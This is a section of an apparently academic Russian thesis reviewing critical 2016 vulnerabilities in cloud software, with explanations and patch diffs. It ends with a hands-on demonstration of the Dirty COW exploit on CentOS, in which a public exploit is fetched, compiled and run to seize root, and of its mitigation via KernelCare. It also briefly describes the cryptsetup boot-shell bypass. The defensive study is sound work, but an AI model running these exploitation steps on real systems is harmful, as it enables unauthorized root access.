\section{Экспериментальные исследования}

В разделе экспериментальных исследований описано исследование наиболее опасных критических уязвимостей в программном обеспечении, используемом в облачных средах, а также эксплуатация уязвимости CVE-2016-5195 в производственной среде.
В подразделе эксплуатации уязвимости также описана защита от уязвимости и меры по предотвращению, мониторингу и оперативному реагированию на подобные инциденты.

\subsection{Критические уязвимости в 2016~г.}

Критические уязвимости 2016~г. в программном обеспечении \cite{cvedetails}, используемом в облачной среде представлено в табл. \ref{vulns}.
\begin{table}[H]
  \caption{Наиболее опасные критические уязвимости 2016~г.}\label{vulns}
  \begin{tabular}{|l|p{2cm}|p{7cm}|l|}
  \hline \hyperlink{cve}{CVE} \hyperlink{id}{ID} & \hyperlink{cvss}{CVSS} & Тип уязвимости & ПО \\
  \hline CVE-2016-5195 & 7.2 & Получение привилегий & Linux Kernel \\
  \hline CVE-2016-6258 & 7.2 & Получение привилегий & Xen \\
  \hline CVE-2016-5696 & 5.8 & Получение данных & Linux Kernel \\
  \hline CVE-2016-3710 & 7.2 & Запуск кода & QEMU \\
  \hline CVE-2016-8655 & 7.2 & DoS, получение привилегий & Linux Kernel \\
  \hline CVE-2016-4997 & 7.2 & DoS, получение привилегий, доступ к памяти & Linux Kernel \\
  \hline CVE-2016-4484 & 7.2 & Получение привилегий & CryptSetup \\
  \hline CVE-2016-6309 & 10.0 & DoS, запуск кода & OpenSSL\\
  \hline CVE-2016-1583 & 7.2 & Переполнение стека, получение привилегий, DoS & Linux Kernel \\
  \hline
  \end{tabular}
\end{table}

Рассмотрим подробнее уязвимости из этой таблицы.

Опасная уязвимость CVE-2016-5195 <<Dirty COW>> обнаружена Филом Остером в ходе исследования зараженного сервера.
Данная уязвимость присутствовала в составе ядра Linux 10 лет, начиная с версии 2.6.22.
Исправлена в октябре 2016~г \cite{dcow}.

Суть уязвимости состоит в том, что при чтении области данных памяти при использовании механизма copy-on-write (\hyperlink{cow}{COW}), используется одна общая копия, а при изменении данных --- создается новая копия, а так называемый <<Dirty Bit>> указывает был ли изменен соответствующий блок памяти.
Проблема возникает при одновременном вызове функции madvise() и записи в страницу памяти, к которой пользователь не имеет доступа на изменение.
При многочисленном повторении запросов происходит <<гонка>> (race condition) и эксплоит получает право на изменение страницы памяти, которая может относится к привилегированному suid-файлу.

Таким образом, с использованием эксплоитов можно повысить привилегии локального пользователя например до пользователя root.
В выпущенном патче добавлен соответствующий флаг FOLL\_COW, который является индикатором окончания операции COW:
\begin{lstlisting}
diff --git a/include/linux/mm.h b/include/linux/mm.h
+#define FOLL_COW 0x4000  /* internal GUP flag */

diff --git a/mm/gup.c b/mm/gup.c
+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)
+{
+  return pte_write(pte) ||
+  ((flags & FOLL_FORCE) && (flags & FOLL_COW) && pte_dirty(pte));
+}

-if ((flags & FOLL_WRITE) && !pte_write(pte)) {
+if ((flags & FOLL_WRITE) && !can_follow_write_pte(pte, flags)) {

-*flags &= ~FOLL_WRITE;
+*flags |= FOLL_COW;
\end{lstlisting}

Уязвимость в гипервизоре Xen --- CVE-2016-6258 (XSA-182) позволяет привилегированному пользователю гостевой системы выполнить свой код на уровне хост-системы.
Уязвимость применима только к режиму паравиртуализации и не работает в режиме аппаратной виртуализации, а также на архитектуре \hyperlink{arm}{ARM}.

В паравиртуализированных окружениях, для быстрого обновления элементов в таблице страниц памяти пропускались ресурсоемкие повторные проверки доступа.
Данные проверки реализовывались с помощью очистки Access/Dirty битов, однако этого оказалось недостаточно \cite{xsa182}.
В патче к уязвимости представлен код, в котором исправлены проверки доступов, а именно добавлены дополнительные повторные проверки:
\begin{lstlisting}
diff --git a/xen/include/asm-x86/page.h b/xen/include/asm-x86/page.h
+#define _PAGE_AVAIL_HIGH (_AC(0x7ff, U) << 12)

diff --git a/xen/arch/x86/mm.c b/xen/arch/x86/mm.c
+#define FASTPATH_FLAG_WHITELIST \
+(_PAGE_NX_BIT | _PAGE_AVAIL_HIGH | _PAGE_AVAIL | _PAGE_GLOBAL | \
+_PAGE_DIRTY | _PAGE_ACCESSED | _PAGE_USER)

-if ( !l1e_has_changed(ol1e, nl1e, PAGE_CACHE_ATTRS | _PAGE_RW | _PAGE_PRESENT) )
+if ( !l1e_has_changed(ol1e, nl1e, ~FASTPATH_FLAG_WHITELIST) )

-if ( !l2e_has_changed(ol2e, nl2e, unlikely(opt_allow_superpage)
-? _PAGE_PSE | _PAGE_RW | _PAGE_PRESENT : _PAGE_PRESENT) )
+if ( !l2e_has_changed(ol2e, nl2e, ~FASTPATH_FLAG_WHITELIST) )

-if ( !l3e_has_changed(ol3e, nl3e, _PAGE_PRESENT) )
+if ( !l3e_has_changed(ol3e, nl3e, ~FASTPATH_FLAG_WHITELIST) )

-if ( !l4e_has_changed(ol4e, nl4e, _PAGE_PRESENT) )
+if ( !l4e_has_changed(ol4e, nl4e, ~FASTPATH_FLAG_WHITELIST) )
\end{lstlisting}

Уязвимость CVE-2016-5696 в ядре Linux, позволяющая вклиниться в стороннее TCP-соединение была обнародована на конференции Usenix Security Symposium.
Из-за недоработки механизмов ограничения интенсивности обработки ACK-пакетов, существует возможность вычислить информацию о номере последовательности, которая идентифицирует поток в TCP-соединении, и со стороны отправить подставные пакеты, которые будут обработаны как часть атакуемого соединения \cite{tcp}.

Суть атаки заключается в наводнении хоста запросами для срабатывания ограничения в обработчике ACK-пакетов, параметры которого можно получить меняя характер нагрузки.
Для атаки необходимо создать шум, чтобы определить значение общего счетчика ограничения интенсивности ACK-ответов, после чего на основании оценки изменения числа отправленных пакетов определить номер порта клиента и осуществить подбор номера последовательности для конкретного TCP-соединения.

В патче к этой уязвимости увеличен лимит TCP ACK и добавлена дополнительная рандомизация для снижения предсказуемости параметров работы системы ограничения ACK-пакетов:
\begin{lstlisting}
diff --git a/net/ipv4/tcp_input.c b/net/ipv4/tcp_input.c
+int sysctl_tcp_challenge_ack_limit = 1000;
-u32 now;
+u32 count, now;
+u32 half = (sysctl_tcp_challenge_ack_limit + 1) >> 1;

-challenge_count = 0;
+WRITE_ONCE(challenge_count, half +
+prandom_u32_max(sysctl_tcp_challenge_ack_limit));

-if (++challenge_count <= sysctl_tcp_challenge_ack_limit) {
+  count = READ_ONCE(challenge_count);
+if (count > 0) {
+  WRITE_ONCE(challenge_count, count - 1);
\end{lstlisting}

Уязвимость CVE-2016-3710 <<Dark portal>> обнаружена в QEMU, который используется для эмуляции оборудования в Xen и KVM.
При использовании метода эмуляции stdvga, из-за записи в регистр памяти VBE\_DISPI\_INDEX\_BANK, хранящий смещение адреса текущего банка видеопамяти, возможно обращение к областям памяти, выходящим за границы буфера, так как предлагаемые банки видеопамяти адресуются с использованием типа byte (uint8\_t *), а обрабатываются как тип word (uint32\_t *) \cite{qemu}.
Уязвимость позволяет выполнить код на хост-система с правами обработчика QEMU (обычно root или qemu-dm).

В патче к уязвимости добавлены дополнительные проверки диапазона памяти:
\begin{lstlisting}
diff --git a/hw/display/vga.c b/hw/display/vga.c
+assert(offset + size <= s->vram_size);
-if (s->vbe_regs[VBE_DISPI_INDEX_BPP] == 4) {
-  val &= (s->vbe_bank_mask >> 2);
-} else {
-  val &= s->vbe_bank_mask;
-}
+val &= s->vbe_bank_mask;
+assert(addr < s->vram_size);

-ret = s->vram_ptr[((addr & ~1) << 1) | plane];
+addr = ((addr & ~1) << 1) | plane;
+if (addr >= s->vram_size) {
+  return 0xff;
+}
+ret = s->vram_ptr[addr];

+if (addr * sizeof(uint32_t) >= s->vram_size) {
+  return 0xff;
+}

+assert(addr < s->vram_size);
+if (addr >= s->vram_size) {
+  return;
+}

+if (addr * sizeof(uint32_t) >= s->vram_size) {
+  return;
+}
\end{lstlisting}

Уязвимость в ядре Linux CVE-2016-8655 позволяет злоумышленнику запустить код на уровне ядра с использованием функции packet\_set\_ring() через манипуляции с кольцевым буфером TPACKET\_V3 \cite{netraw}.
Использовать уязвимость можно для выхода за пределы контейнера, для этого необходимо чтобы локальный пользователь имел полномочия по созданию сокетов AF\_PACKET.

Устранена уязвимость в декабре 2016~г. с помощью кода, перехватывающий возможные гонки:
\begin{lstlisting}
diff --git a/net/packet/af_packet.c b/net/packet/af_packet.c
-if (po->rx_ring.pg_vec || po->tx_ring.pg_vec)
-  return -EBUSY;

-po->tp_version = val;
-return 0;
+break;

+lock_sock(sk);
+if (po->rx_ring.pg_vec || po->tx_ring.pg_vec) {
+  ret = -EBUSY;
+} else {
+  po->tp_version = val;
+  ret = 0;
+}
+release_sock(sk);
+return ret;

+lock_sock(sk);
+release_sock(sk);
\end{lstlisting}

Уязвимость CVE-2016-4997 присутствует в подсистеме netfilter ядра Linux и связана с недоработкой в обработчике setsockopt IPT\_SO\_SET\_REPLACE и может быть использована в системах, использующих изолированные контейнеры \cite{netf}.
Проблема проявляется при испоользовании пространств имен для изоляции сети и идентификаторов.

В патче к уязвимости была добавлена дополнительная проверка адреса функции xt\_entry\_foreach():
\begin{lstlisting}
diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c
+if (pos + size >= newinfo->size)
+  return 0;

+e = (struct arpt_entry *)
+(entry0 + newpos);

+if (newpos >= newinfo->size)
+  return 0;

-if (!mark_source_chains(newinfo, repl->valid_hooks, entry0)) {
-  duprintf("Looping hook\n");
+if (!mark_source_chains(newinfo, repl->valid_hooks, entry0))
-}

diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c
+if (pos + size >= newinfo->size)
+  return 0;

+e = (struct ipt_entry *)
+(entry0 + newpos);
+if (newpos >= newinfo->size)
+  return 0;

diff --git  a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c
+if (pos + size >= newinfo->size)
+  return 0;

+e = (struct ip6t_entry *)
+(entry0 + newpos);
+if (newpos >= newinfo->size)
+  return 0;
\end{lstlisting}

Уязвимость CVE-2016-4484 выявлена в пакете CryptSetup, применяемом для шифрования дисковых разделов в Linux.
Ошибка в коде скрипта разблокировки позволяет получить доступ в командную оболочку начального загрузочного окружения с правами суперпользователя.

Несмотря на шифрование разделов возможны ситуации при которых некоторые разделы не шифруются (например /boot), таким образом возможно оставить в системе исполняемый файл с правами setuid root для повышения привилегий или скопировать шифрованный раздел по сети для подбора пароля \cite{cryptsetup}.

Для эксплуатации уязвимости необходимо удерживать клавишу Enter в ответ на запрос доступа к зашифрованным разделам.
Спустя 70 секунд удерживания клавиши осуществися автоматический вход в командную оболочку.

Проблема вызвана некорректной обработкой лимита на максимальное число попыток монтирования.
Исправление доступно в виде загрузки \hyperlink{grub}{GRUB} с параметром <<panic>> или в виде патча, устанавливающего лимит:
\begin{lstlisting}
diff --git a/scripts/local-top/cryptroot b/scripts/local-top/cryptroot
+success=0

+  success=1

-if [ $crypttries -gt 0 ] && [ $count -gt $crypttries ]; then
-  message "cryptsetup: maximum number of tries exceeded for $crypttarget"
-  return 1
+if [ $success -eq 0 ]; then
+  message "cryptsetup: Maximum number of tries exceeded. Please reboot."
+  while true; do
+    sleep 100
+  done
\end{lstlisting}

Сотрудники компании Google выявили уязвимость CVE-2016-6309 в OpenSSL, подзволяющая злоумышленникам выполнить произвольный код при обработке отправленных ими пакетов.
При получении сообщения размером больше 16 Кб, при перераспределении памяти остается висячий указатель на старое положение буфера и запись поступившего сообщения производится в уже ранее освобожденную область памяти \cite{openssl}.

В патче опубликованном в сентябре 2016~г. исправлена проблема с висячим указателем:
\begin{lstlisting}
diff --git a/ssl/statem/statem.c b/ssl/statem/statem.c
+static int grow_init_buf(SSL *s, size_t size) {
+  size_t msg_offset = (char *)s->init_msg - s->init_buf->data;
+  if (!BUF_MEM_grow_clean(s->init_buf, (int)size))
+    return 0;
+  if (size < msg_offset)
+    return 0;
+  s->init_msg = s->init_buf->data + msg_offset;
+  return 1;
+}

-&& !BUF_MEM_grow_clean(s->init_buf,
-(int)s->s3->tmp.message_size
-+ SSL3_HM_HEADER_LENGTH)) {
+&& !grow_init_buf(s, s->s3->tmp.message_size
++ SSL3_HM_HEADER_LENGTH)) {
\end{lstlisting}

Ядро Linux подвержено уязвимости CVE-2016-1583, благодаря которой существует возможность поднятия привилегий локальному пользователю при помощи eCryptfs.

С помощью формирования рекурсивных вызовов в пространстве пользователя позможно добиться переполнения стека ядра.
Злоумышленник может организовать цепочку рекурсивных отражений в память файла, при которой процесс отражает в свое окружения другие файлы \cite{ecryptfs}.
При чтении содержимого файлов будет вызван обработчик pagefault для процессов, что приведет к переполнению стека.

Соответствующие исправления были приняты в июне 2016~г. в ядре Linux:
\begin{lstlisting}
diff --git a/fs/proc/root.c b/fs/proc/root.c
+sb->s_stack_depth = FILESYSTEM_MAX_STACK_DEPTH;

diff --git a/fs/ecryptfs/kthread.c b/fs/ecryptfs/kthread.c
+#include <linux/file.h>

-goto out;
+goto have_file;

-if (IS_ERR(*lower_file))
+if (IS_ERR(*lower_file)) {
+  goto out;
+}
+have_file:
+  if ((*lower_file)->f_op->mmap == NULL) {
+    fput(*lower_file);
+    *lower_file = NULL;
+    rc = -EMEDIUMTYPE;
+  }
\end{lstlisting}


\subsection{Эксплуатация уязвимостии ядра Linux CVE-2016-5195 <<Dirty COW>>}

Наиболее опасной уязвимостью 2016~г. является CVE-2016-5195 с кодовым именем <<Dirty COW>>.
Такая степень опасности обусловлена тем, что ей подвержены практически все ядра Linux начиная с версии 2.6.22, а также легкостью применения эксплоитов.

В данном разделе применяется эксплоит \cite{dcowexp}, позволяющий получить права суперпользоваться из-под локального пользователя.

Для эксплуатации используется дистрибутив CentOS:
\begin{lstlisting}
# cat /etc/redhat-release
CentOS Linux release 7.2.1511 (Core)
# uname -r
3.10.0-327.el7.x86_64
\end{lstlisting}

Необходимо повысить привилегии локального пользователя dcow до суперпользователя root, для этого необходимо скачать эксплоит и установить инструменты для компиляции (gcc/g++).
После установки всех необходимых настроек компилируем код эксплоита:
\begin{lstlisting}
$ id
uid=1000(dcow) gid=1000(dcow) groups=1000(dcow)
$ git clone https://github.com/gbonacini/CVE-2016-5195
$ cd CVE-2016-5195/
$ make
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
\end{lstlisting}

После компиляции исходного кода эксплоита, в текущем каталоге появляется бинарный файл, запуск которого в автоматическом режиме позволяет получить права доступа суперпользователя и сменить его пароль на <<dirtyCowFun>>:
\begin{lstlisting}
$ ./dcow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
$ su root
Password: dirtyCowFun
# id
uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}

Для исправления уязвимости в кратчайшие сроки для ядра Linux был внесен патч, а мейнтейнеры дистрибутивов опубликовали пакеты с исправлениями.
Для обновления дистрибутива и устранения уязвимости необходимо скачать исправленную версию ядра и произвести перезагрузку.

В случае когда целый парк серверов не имеет возможности совершать перезагрузку необходимо использовать такие технологии как kpatch, livepatch, KernelCare.
Подобные технологии позволяют применять патчи для ядра Linux без перезагрузки.

Технология KernelCare является коммерческим решением и позволяет без особых проблем в оперативном порядке использовать патчи для ядра, в том числе патч для CVE-2016-5195.

Пример эксплуатации уязвимости при использовании KernelCare:

\begin{lstlisting}
# /usr/bin/kcarectl --uname
3.10.0-327.36.3.el7.x86_64
# /usr/bin/kcarectl --patch-info  | grep CVE-2016-5195 -A3 -B3
kpatch-name: 3.10.0/0001-mm-remove-gup_flags-FOLL_WRITE-games-from-__get_user-327.patch
kpatch-description: mm: remove gup_flags FOLL_WRITE games from __get_user_pages()
kpatch-kernel: >kernel-3.10.0-327.36.2.el7
kpatch-cve: CVE-2016-5195
kpatch-cvss: 6.9
kpatch-cve-url: https://access.redhat.com/security/cve/cve-2016-5195
kpatch-patch-url: https://git.kernel.org/linus/19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
$ ./dcow
Running ...
\end{lstlisting}

Как видно из вывода команд, эксплоит не работает при включенном KernelCare.

Пример отключения KernelCare и попытка эксплуатации уязвимости:
\begin{lstlisting}
# /usr/bin/kcarectl --unload
Updates already downloaded
KernelCare protection disabled, kernel might not be safe
# su - dcow
$ cd CVE-2016-5195/
$ ./dcow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
\end{lstlisting}

Стоимость одной лицензии KernelCare составляет 4\$/г.
В облачной среде, где при каждой минуте простоя работы облачный провайдер теряет деньги, использование подобных технологий позволяет существенно уменьшить даунтайм серверов.

\clearpage
